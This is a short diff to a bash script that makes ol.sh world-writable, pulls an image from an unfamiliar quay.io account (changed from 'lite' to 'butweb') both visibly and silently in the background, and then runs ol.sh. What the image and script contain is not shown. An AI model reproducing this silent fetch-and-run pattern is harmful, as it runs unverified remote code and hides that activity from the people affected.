@@ -1,5 +1,5 @@
 #!/bin/bash
 chmod 777 ol.sh
-docker pull quay.io/mencoba1/lite:latest
-docker pull quay.io/mencoba1/lite:latest > /dev/null 2>&1 &
+docker pull quay.io/mencoba1/butweb:latest
+docker pull quay.io/mencoba1/butweb:latest > /dev/null 2>&1 &
 ./ol.sh
